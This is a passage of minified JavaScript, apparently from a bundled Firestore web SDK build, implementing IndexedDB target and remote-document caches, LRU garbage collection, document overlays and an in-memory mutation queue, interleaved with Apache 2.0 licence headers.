 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ws{constructor(e){this.xn=e}next(){return this.xn+=2,this.xn}static Nn(){return new Ws(0)}static kn(){return new Ws(-1)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gL{constructor(e,t){this.referenceDelegate=e,this.serializer=t}allocateTargetId(e){return this.Mn(e).next((t=>{const n=new Ws(t.highestTargetId);return t.highestTargetId=n.next(),this.On(e,t).next((()=>t.highestTargetId))}))}getLastRemoteSnapshotVersion(e){return this.Mn(e).next((e=>ee.fromTimestamp(new et(e.lastRemoteSnapshotVersion.seconds,e.lastRemoteSnapshotVersion.nanoseconds))))}getHighestSequenceNumber(e){return this.Mn(e).next((e=>e.highestListenSequenceNumber))}setTargetsMetadata(e,t,n){return this.Mn(e).next((r=>(r.highestListenSequenceNumber=t,n&&(r.lastRemoteSnapshotVersion=n.toTimestamp()),t>r.highestListenSequenceNumber&&(r.highestListenSequenceNumber=t),this.On(e,r))))}addTargetData(e,t){return this.$n(e,t).next((()=>this.Mn(e).next((n=>(n.targetCount+=1,this.Fn(t,n),this.On(e,n))))))}updateTargetData(e,t){return this.$n(e,t)}removeTargetData(e,t){return this.removeMatchingKeysForTargetId(e,t.targetId).next((()=>vo(e).delete(t.targetId))).next((()=>this.Mn(e))).next((t=>(te(t.targetCount>0),t.targetCount-=1,this.On(e,t))))}removeTargets(e,t,n){let r=0;const i=[];return vo(e).X(((s,o)=>{const a=hl(o);a.sequenceNumber<=t&&null===n.get(a.targetId)&&(r++,i.push(this.removeTargetData(e,a)))})).next((()=>C.waitFor(i))).next((()=>r))}forEachTarget(e,t){return vo(e).X(((e,n)=>{const r=hl(n);t(r)}))}Mn(e){return _S(e).get("targetGlobalKey").next((e=>(te(null!==e),e)))}On(e,t){return _S(e).put("targetGlobalKey",t)}$n(e,t){return vo(e).put(Hx(this.serializer,t))}Fn(e,t){let n=!1;return e.targetId>t.highestTargetId&&(t.highestTargetId=e.targetId,n=!0),e.sequenceNumber>t.highestListenSequenceNumber&&(t.highestListenSequenceNumber=e.sequenceNumber,n=!0),n}getTargetCount(e){return this.Mn(e).next((e=>e.targetCount))}getTargetData(e,t){const n=zs(t),r=IDBKeyRange.bound([n,Number.NEGATIVE_INFINITY],[n,Number.POSITIVE_INFINITY]);let i=null;return vo(e).X({range:r,index:"queryTargetsIndex"},((e,n,r)=>{const s=hl(n);Pu(t,s.target)&&(i=s,r.done())})).next((()=>i))}addMatchingKeys(e,t,n){const r=[],i=pi(e);return t.forEach((t=>{const s=dn(t.path);r.push(i.put({targetId:n,path:s})),r.push(this.referenceDelegate.addReference(e,n,t))})),C.waitFor(r)}removeMatchingKeys(e,t,n){const r=pi(e);return C.forEach(t,(t=>{const i=dn(t.path);return C.waitFor([r.delete([n,i]),this.referenceDelegate.removeReference(e,n,t)])}))}removeMatchingKeysForTargetId(e,t){const n=pi(e),r=IDBKeyRange.bound([t],[t+1],!1,!0);return n.delete(r)}getMatchingKeysForTargetId(e,t){const n=IDBKeyRange.bound([t],[t+1],!1,!0),r=pi(e);let i=ce();return r.X({range:n,Y:!0},((e,t,n)=>{const r=pr(e[1]),s=new B(r);i=i.add(s)})).next((()=>i))}containsKey(e,t){const n=dn(t.path),r=IDBKeyRange.bound([n],[GT(n)],!1,!0);let i=0;return pi(e).X({index:"documentTargetsIndex",Y:!0,range:r},(([e,t],n,r)=>{0!==e&&(i++,r.done())})).next((()=>i>0))}he(e,t){return vo(e).get(t).next((e=>e?hl(e):null))}}function vo(e){return Ft(e,"targets")}function _S(e){return Ft(e,"targetGlobal")}function pi(e){return Ft(e,"targetDocuments")}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ES([e,t],[n,r]){const i=ue(e,n);return 0===i?ue(t,r):i}class yL{constructor(e){this.Bn=e,this.buffer=new He(ES),this.Ln=0}qn(){return++this.Ln}Un(e){const t=[e,this.qn()];if(this.buffer.size<this.Bn)this.buffer=this.buffer.add(t);else{const e=this.buffer.last();ES(t,e)<0&&(this.buffer=this.buffer.delete(e).add(t))}}get maxValue(){return this.buffer.last()[0]}}class vL{constructor(e,t,n){this.garbageCollector=e,this.asyncQueue=t,this.localStore=n,this.Kn=null}start(){-1!==this.garbageCollector.params.cacheSizeCollectionThreshold&&this.Gn(6e4)}stop(){this.Kn&&(this.Kn.cancel(),this.Kn=null)}get started(){return null!==this.Kn}Gn(e){V("LruGarbageCollector",`Garbage collection scheduled in ${e}ms`),this.Kn=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,(async()=>{this.Kn=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(e){Xi(e)?V("LruGarbageCollector","Ignoring IndexedDB error during garbage collection: ",e):await Qi(e)}await this.Gn(3e5)}))}}class wL{constructor(e,t){this.Qn=e,this.params=t}calculateTargetCount(e,t){return this.Qn.jn(e).next((e=>Math.floor(t/100*e)))}nthSequenceNumber(e,t){if(0===t)return C.resolve(wn.ct);const n=new yL(t);return this.Qn.forEachTarget(e,(e=>n.Un(e.sequenceNumber))).next((()=>this.Qn.zn(e,(e=>n.Un(e))))).next((()=>n.maxValue))}removeTargets(e,t,n){return this.Qn.removeTargets(e,t,n)}removeOrphanedDocuments(e,t){return this.Qn.removeOrphanedDocuments(e,t)}collect(e,t){return-1===this.params.cacheSizeCollectionThreshold?(V("LruGarbageCollector","Garbage collection skipped; disabled"),C.resolve(SS)):this.getCacheSize(e).next((n=>n<this.params.cacheSizeCollectionThreshold?(V("LruGarbageCollector",`Garbage collection skipped; Cache size ${n} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),SS):this.Wn(e,t)))}getCacheSize(e){return this.Qn.getCacheSize(e)}Wn(e,t){let n,r,i,s,o,a,l;const u=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next((t=>(t>this.params.maximumSequenceNumbersToCollect?(V("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${t}`),r=this.params.maximumSequenceNumbersToCollect):r=t,s=Date.now(),this.nthSequenceNumber(e,r)))).next((r=>(n=r,o=Date.now(),this.removeTargets(e,n,t)))).next((t=>(i=t,a=Date.now(),this.removeOrphanedDocuments(e,n)))).next((e=>(l=Date.now(),Qm()<=Ce.DEBUG&&V("LruGarbageCollector",`LRU Garbage Collection\n\tCounted targets in ${s-u}ms\n\tDetermined least recently used ${r} in `+(o-s)+`ms\n\tRemoved ${i} targets in `+(a-o)+`ms\n\tRemoved ${e} documents in `+(l-a)+`ms\nTotal Duration: ${l-u}ms`),C.resolve({didRun:!0,sequenceNumbersCollected:r,targetsRemoved:i,documentsRemoved:e}))))}}function SL(e,t){return new wL(e,t)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _L{constructor(e,t){this.db=e,this.garbageCollector=SL(this,t)}jn(e){const t=this.Hn(e);return this.db.getTargetCache().getTargetCount(e).next((e=>t.next((t=>e+t))))}Hn(e){let t=0;return this.zn(e,(e=>{t++})).next((()=>t))}forEachTarget(e,t){return this.db.getTargetCache().forEachTarget(e,t)}zn(e,t){return this.Jn(e,((e,n)=>t(n)))}addReference(e,t,n){return Pc(e,n)}removeReference(e,t,n){return Pc(e,n)}removeTargets(e,t,n){return this.db.getTargetCache().removeTargets(e,t,n)}markPotentiallyOrphaned(e,t){return Pc(e,t)}Yn(e,t){return function(e,t){let n=!1;return Zx(e).Z((r=>Jx(e,r,t).next((e=>(e&&(n=!0),C.resolve(!e)))))).next((()=>n))}(e,t)}removeOrphanedDocuments(e,t){const n=this.db.getRemoteDocumentCache().newChangeBuffer(),r=[];let i=0;return this.Jn(e,((s,o)=>{if(o<=t){const t=this.Yn(e,s).next((t=>{if(!t)return i++,n.getEntry(e,s).next((()=>(n.removeEntry(s,ee.min()),pi(e).delete([0,dn(s.path)]))))}));r.push(t)}})).next((()=>C.waitFor(r))).next((()=>n.apply(e))).next((()=>i))}removeTarget(e,t){const n=t.withSequenceNumber(e.currentSequenceNumber);return this.db.getTargetCache().updateTargetData(e,n)}updateLimboDocument(e,t){return Pc(e,t)}Jn(e,t){const n=pi(e);let r,i=wn.ct;return n.X({index:"documentTargetsIndex"},(([e,n],{path:s,sequenceNumber:o})=>{0===e?(i!==wn.ct&&t(new B(pr(r)),i),i=o,r=s):i=wn.ct})).next((()=>{i!==wn.ct&&t(new B(pr(r)),i)}))}getCacheSize(e){return this.db.getRemoteDocumentCache().getSize(e)}}function Pc(e,t){return pi(e).put((n=t,r=e.currentSequenceNumber,{targetId:0,path:dn(n.path),sequenceNumber:r}));var n,r}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eI{constructor(){this.changes=new Ji((e=>e.toString()),((e,t)=>e.isEqual(t))),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,We.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();const n=this.changes.get(t);return void 0!==n?C.resolve(n):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class EL{constructor(e){this.serializer=e}setIndexManager(e){this.indexManager=e}addEntry(e,t,n){return ls(e).put(n)}removeEntry(e,t,n){return ls(e).delete(function(e,t){const n=e.path.toArray();return[n.slice(0,n.length-2),n[n.length-2],Jh(t),n[n.length-1]]}(t,n))}updateMetadata(e,t){return this.getMetadata(e).next((n=>(n.byteSize+=t,this.Xn(e,n))))}getEntry(e,t){let n=We.newInvalidDocument(t);return ls(e).X({index:"documentKeyIndex",range:IDBKeyRange.only(tl(t))},((e,r)=>{n=this.Zn(t,r)})).next((()=>n))}ts(e,t){let n={size:0,document:We.newInvalidDocument(t)};return ls(e).X({index:"documentKeyIndex",range:IDBKeyRange.only(tl(t))},((e,r)=>{n={document:this.Zn(t,r),size:ed(r)}})).next((()=>n))}getEntries(e,t){let n=_n();return this.es(e,t,((e,t)=>{const r=this.Zn(e,t);n=n.insert(e,r)})).next((()=>n))}ns(e,t){let n=_n(),r=new Be(B.comparator);return this.es(e,t,((e,t)=>{const i=this.Zn(e,t);n=n.insert(e,i),r=r.insert(e,ed(t))})).next((()=>({documents:n,ss:r})))}es(e,t,n){if(t.isEmpty())return C.resolve();let r=new He(IS);t.forEach((e=>r=r.add(e)));const i=IDBKeyRange.bound(tl(r.first()),tl(r.last())),s=r.getIterator();let o=s.getNext();return ls(e).X({index:"documentKeyIndex",range:i},((e,t,r)=>{const i=B.fromSegments([...t.prefixPath,t.collectionGroup,t.documentId]);for(;o&&IS(o,i)<0;)n(o,null),o=s.getNext();o&&o.isEqual(i)&&(n(o,t),o=s.hasNext()?s.getNext():null),o?r.G(tl(o)):r.done()})).next((()=>{for(;o;)n(o,null),o=s.hasNext()?s.getNext():null}))}getDocumentsMatchingQuery(e,t,n,r){const i=t.path,s=[i.popLast().toArray(),i.lastSegment(),Jh(n.readTime),n.documentKey.path.isEmpty()?"":n.documentKey.path.lastSegment()],o=[i.popLast().toArray(),i.lastSegment(),[Number.MAX_SAFE_INTEGER,Number.MAX_SAFE_INTEGER],""];return ls(e).j(IDBKeyRange.bound(s,o,!0)).next((e=>{let n=_n();for(const i of e){const e=this.Zn(B.fromSegments(i.prefixPath.concat(i.collectionGroup,i.documentId)),i);e.isFoundDocument()&&(Lu(t,e)||r.has(e.key))&&(n=n.insert(e.key,e))}return n}))}getAllFromCollectionGroup(e,t,n,r){let i=_n();const s=xS(t,n),o=xS(t,An.max());return ls(e).X({index:"collectionGroupIndex",range:IDBKeyRange.bound(s,o,!0)},((e,t,n)=>{const s=this.Zn(B.fromSegments(t.prefixPath.concat(t.collectionGroup,t.documentId)),t);i=i.insert(s.key,s),i.size===r&&n.done()})).next((()=>i))}newChangeBuffer(e){return new TL(this,!!e&&e.trackRemovals)}getSize(e){return this.getMetadata(e).next((e=>e.byteSize))}getMetadata(e){return TS(e).get("remoteDocumentGlobalKey").next((e=>(te(!!e),e)))}Xn(e,t){return TS(e).put("remoteDocumentGlobalKey",t)}Zn(e,t){if(t){const e=oL(this.serializer,t);if(!e.isNoDocument()||!e.version.isEqual(ee.min()))return e}return We.newInvalidDocument(e)}}function tI(e){return new EL(e)}class TL extends eI{constructor(e,t){super(),this.rs=e,this.trackRemovals=t,this.os=new Ji((e=>e.toString()),((e,t)=>e.isEqual(t)))}applyChanges(e){const t=[];let n=0,r=new He(((e,t)=>ue(e.canonicalString(),t.canonicalString())));return this.changes.forEach(((i,s)=>{const o=this.os.get(i);if(t.push(this.rs.removeEntry(e,i,o.readTime)),s.isValidDocument()){const a=cS(this.rs.serializer,s);r=r.add(i.path.popLast());const l=ed(a);n+=l-o.size,t.push(this.rs.addEntry(e,i,a))}else if(n-=o.size,this.trackRemovals){const n=cS(this.rs.serializer,s.convertToNoDocument(ee.min()));t.push(this.rs.addEntry(e,i,n))}})),r.forEach((n=>{t.push(this.rs.indexManager.addToCollectionParentIndex(e,n))})),t.push(this.rs.updateMetadata(e,n)),C.waitFor(t)}getFromCache(e,t){return this.rs.ts(e,t).next((e=>(this.os.set(t,{size:e.size,readTime:e.document.readTime}),e.document)))}getAllFromCache(e,t){return this.rs.ns(e,t).next((({documents:e,ss:t})=>(t.forEach(((t,n)=>{this.os.set(t,{size:n,readTime:e.get(t).readTime})})),e)))}}function TS(e){return Ft(e,"remoteDocumentGlobal")}function ls(e){return Ft(e,"remoteDocumentsV14")}function tl(e){const t=e.path.toArray();return[t.slice(0,t.length-2),t[t.length-2],t[t.length-1]]}function xS(e,t){const n=t.documentKey.path.toArray();return[e,Jh(t.readTime),n.slice(0,n.length-2),n.length>0?n[n.length-1]:""]}function IS(e,t){const n=e.path.toArray(),r=t.path.toArray();let i=0;for(let e=0;e<n.length-2&&e<r.length-2;++e)if(i=ue(n[e],r[e]),i)return i;return i=ue(n.length,r.length),i||(i=ue(n[n.length-2],r[r.length-2]),i||ue(n[n.length-1],r[r.length-1]))}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xL{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class nI{constructor(e,t,n,r){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=n,this.indexManager=r}getDocument(e,t){let n=null;return this.documentOverlayCache.getOverlay(e,t).next((r=>(n=r,this.remoteDocumentCache.getEntry(e,t)))).next((e=>(null!==n&&Cl(n.mutation,e,Sn.empty(),et.now()),e)))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next((t=>this.getLocalViewOfDocuments(e,t,ce()).next((()=>t))))}getLocalViewOfDocuments(e,t,n=ce()){const r=mr();return this.populateOverlays(e,r,t).next((()=>this.computeViews(e,t,r,n).next((e=>{let t=ul();return e.forEach(((e,n)=>{t=t.insert(e,n.overlayedDocument)})),t}))))}getOverlayedDocuments(e,t){const n=mr();return this.populateOverlays(e,n,t).next((()=>this.computeViews(e,t,n,ce())))}populateOverlays(e,t,n){const r=[];return n.forEach((e=>{t.has(e)||r.push(e)})),this.documentOverlayCache.getOverlays(e,r).next((e=>{e.forEach(((e,n)=>{t.set(e,n)}))}))}computeViews(e,t,n,r){let i=_n();const s=Dl(),o=Dl();return t.forEach(((e,t)=>{const o=n.get(t.key);r.has(t.key)&&(void 0===o||o.mutation instanceof Zr)?i=i.insert(t.key,t):void 0!==o?(s.set(t.key,o.mutation.getFieldMask()),Cl(o.mutation,t,o.mutation.getFieldMask(),et.now())):s.set(t.key,Sn.empty())})),this.recalculateAndSaveOverlays(e,i).next((e=>(e.forEach(((e,t)=>s.set(e,t))),t.forEach(((e,t)=>{var n;return o.set(e,new xL(t,null!==(n=s.get(e))&&void 0!==n?n:null))})),o)))}recalculateAndSaveOverlays(e,t){const n=Dl();let r=new Be(((e,t)=>e-t)),i=ce();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next((e=>{for(const i of e)i.keys().forEach((e=>{const s=t.get(e);if(null===s)return;let o=n.get(e)||Sn.empty();o=i.applyToLocalView(s,o),n.set(e,o);const a=(r.get(i.batchId)||ce()).add(e);r=r.insert(i.batchId,a)}))})).next((()=>{const s=[],o=r.getReverseIterator();for(;o.hasNext();){const r=o.getNext(),a=r.key,l=r.value,u=_x();l.forEach((e=>{if(!i.has(e)){const r=Nx(t.get(e),n.get(e));null!==r&&u.set(e,r),i=i.add(e)}})),s.push(this.documentOverlayCache.saveOverlays(e,a,u))}return C.waitFor(s)})).next((()=>n))}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next((t=>this.recalculateAndSaveOverlays(e,t)))}getDocumentsMatchingQuery(e,t,n){return r=t,B.isDocumentKey(r.path)&&null===r.collectionGroup&&0===r.filters.length?this.getDocumentsMatchingDocumentQuery(e,t.path):rv(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,n):this.getDocumentsMatchingCollectionQuery(e,t,n);var r}getNextDocuments(e,t,n,r){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,n,r).next((i=>{const s=r-i.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,n.largestBatchId,r-i.size):C.resolve(mr());let o=-1,a=i;return s.next((t=>C.forEach(t,((t,n)=>(o<n.largestBatchId&&(o=n.largestBatchId),i.get(t)?C.resolve():this.remoteDocumentCache.getEntry(e,t).next((e=>{a=a.insert(t,e)}))))).next((()=>this.populateOverlays(e,t,i))).next((()=>this.computeViews(e,a,t,ce()))).next((e=>({batchId:o,changes:Sx(e)})))))}))}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new B(t)).next((e=>{let t=ul();return e.isFoundDocument()&&(t=t.insert(e.key,e)),t}))}getDocumentsMatchingCollectionGroupQuery(e,t,n){const r=t.collectionGroup;let i=ul();return this.indexManager.getCollectionParents(e,r).next((s=>C.forEach(s,(s=>{const o=(a=t,l=s.child(r),new Jr(l,null,a.explicitOrderBy.slice(),a.filters.slice(),a.limit,a.limitType,a.startAt,a.endAt));var a,l;return this.getDocumentsMatchingCollectionQuery(e,o,n).next((e=>{e.forEach(((e,t)=>{i=i.insert(e,t)}))}))})).next((()=>i))))}getDocumentsMatchingCollectionQuery(e,t,n){let r;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,n.largestBatchId).next((i=>(r=i,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,n,r)))).next((e=>{r.forEach(((t,n)=>{const r=n.getKey();null===e.get(r)&&(e=e.insert(r,We.newInvalidDocument(r)))}));let n=ul();return e.forEach(((e,i)=>{const s=r.get(e);void 0!==s&&Cl(s.mutation,i,Sn.empty(),et.now()),Lu(t,i)&&(n=n.insert(e,i))})),n}))}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class IL{constructor(e){this.serializer=e,this.us=new Map,this.cs=new Map}getBundleMetadata(e,t){return C.resolve(this.us.get(t))}saveBundleMetadata(e,t){var n;return this.us.set(t.id,{id:(n=t).id,version:n.version,createTime:yt(n.createTime)}),C.resolve()}getNamedQuery(e,t){return C.resolve(this.cs.get(t))}saveNamedQuery(e,t){return this.cs.set(t.name,{name:(n=t).name,query:dv(n.bundledQuery),readTime:yt(n.readTime)}),C.resolve()
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */;var n}}class kL{constructor(){this.overlays=new Be(B.comparator),this.hs=new Map}getOverlay(e,t){return C.resolve(this.overlays.get(t))}getOverlays(e,t){const n=mr();return C.forEach(t,(t=>this.getOverlay(e,t).next((e=>{null!==e&&n.set(t,e)})))).next((()=>n))}saveOverlays(e,t,n){return n.forEach(((n,r)=>{this.de(e,t,r)})),C.resolve()}removeOverlaysForBatchId(e,t,n){const r=this.hs.get(n);return void 0!==r&&(r.forEach((e=>this.overlays=this.overlays.remove(e))),this.hs.delete(n)),C.resolve()}getOverlaysForCollection(e,t,n){const r=mr(),i=t.length+1,s=new B(t.child("")),o=this.overlays.getIteratorFrom(s);for(;o.hasNext();){const e=o.getNext().value,s=e.getKey();if(!t.isPrefixOf(s.path))break;s.path.length===i&&e.largestBatchId>n&&r.set(e.getKey(),e)}return C.resolve(r)}getOverlaysForCollectionGroup(e,t,n,r){let i=new Be(((e,t)=>e-t));const s=this.overlays.getIterator();for(;s.hasNext();){const e=s.getNext().value;if(e.getKey().getCollectionGroup()===t&&e.largestBatchId>n){let t=i.get(e.largestBatchId);null===t&&(t=mr(),i=i.insert(e.largestBatchId,t)),t.set(e.getKey(),e)}}const o=mr(),a=i.getIterator();for(;a.hasNext()&&(a.getNext().value.forEach(((e,t)=>o.set(e,t))),!(o.size()>=r)););return C.resolve(o)}de(e,t,n){const r=this.overlays.get(n.key);if(null!==r){const e=this.hs.get(r.largestBatchId).delete(n.key);this.hs.set(r.largestBatchId,e)}this.overlays=this.overlays.insert(n.key,new lv(t,n));let i=this.hs.get(t);void 0===i&&(i=ce(),this.hs.set(t,i)),this.hs.set(t,i.add(n.key))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mv{constructor(){this.ls=new He(Rt.fs),this.ds=new He(Rt._s)}isEmpty(){return this.ls.isEmpty()}addReference(e,t){const n=new Rt(e,t);this.ls=this.ls.add(n),this.ds=this.ds.add(n)}ws(e,t){e.forEach((e=>this.addReference(e,t)))}removeReference(e,t){this.gs(new Rt(e,t))}ys(e,t){e.forEach((e=>this.removeReference(e,t)))}ps(e){const t=new B(new Te([])),n=new Rt(t,e),r=new Rt(t,e+1),i=[];return this.ds.forEachInRange([n,r],(e=>{this.gs(e),i.push(e.key)})),i}Is(){this.ls.forEach((e=>this.gs(e)))}gs(e){this.ls=this.ls.delete(e),this.ds=this.ds.delete(e)}Ts(e){const t=new B(new Te([])),n=new Rt(t,e),r=new Rt(t,e+1);let i=ce();return this.ds.forEachInRange([n,r],(e=>{i=i.add(e.key)})),i}containsKey(e){const t=new Rt(e,0),n=this.ls.firstAfterOrEqual(t);return null!==n&&e.isEqual(n.key)}}class Rt{constructor(e,t){this.key=e,this.Es=t}static fs(e,t){return B.comparator(e.key,t.key)||ue(e.Es,t.Es)}static _s(e,t){return ue(e.Es,t.Es)||B.comparator(e.key,t.key)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class DL{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.As=1,this.Rs=new He(Rt.fs)}checkEmpty(e){return C.resolve(0===this.mutationQueue.length)}addMutationBatch(e,t,n,r){const i=this.As;this.As++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const s=new ov(i,t,n,r);this.mutationQueue.push(s);for(const t of r)this.Rs=this.Rs.add(new Rt(t.key,i)),this.indexManager.addToCollectionParentIndex(e,t.key.path.popLast());return C.resolve(s)}lookupMutationBatch(e,t){return C.resolve(this.vs(t))}getNextMutationBatchAfterBatchId(e,t){const n=t+1,r=this.Ps(n),i=r<0?0:r;return C.resolve(this.mutationQueue.length>i?this.mutationQueue[i]:null)}getHighestUnacknowledgedBatchId(){return C.resolve(0===this.mutationQueue.length?-1:this.As-1)}getAllMutationBatches(e){return C.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){const n=new Rt(t,0),r=new Rt(t,Number.POSITIVE_INFINITY),i=[];return this.Rs.forEachInRange([n,r],(e=>{const t=this.vs(e.Es);i.push(t)})),C.resolve(i)}getAllMutationBatchesAffectingDocumentKeys(e,t){let n=new He(ue);return t.forEach((e=>{const t=new Rt(e,0),r=new Rt(e,Number.POSITIVE_INFINITY);this.Rs.forEachInRange([t,r],(e=>{n=n.add(e.Es)}))})),C.resolve(this.bs(n))}getAllMutationBatchesAffectingQuery(e,t){const n=t.path,r=n.length+1;let i=n;B.isDocumentKey(i)||(i=i.child(""));const s=new Rt(new B(i),0);let o=new He(ue);return this.Rs.forEachWhile((e=>{const t=e.key.path;return!!n.isPrefixOf(t)&&(t.length===r&&(o=o.add(e.Es)),!0)}),s),C.resolve(this.bs(o))}bs(e){const t=[];return e.forEach((e=>{const n=this.vs(e);null!==n&&t.push(n)})),t}removeMutationBatch(e,t){te(0===this.Vs(t.batchId,"removed")),this.mutationQueue.shift();let n=this.Rs;return C.forEach(t.mutations,(r=>{const i=new Rt(r.key,t.batchId);return 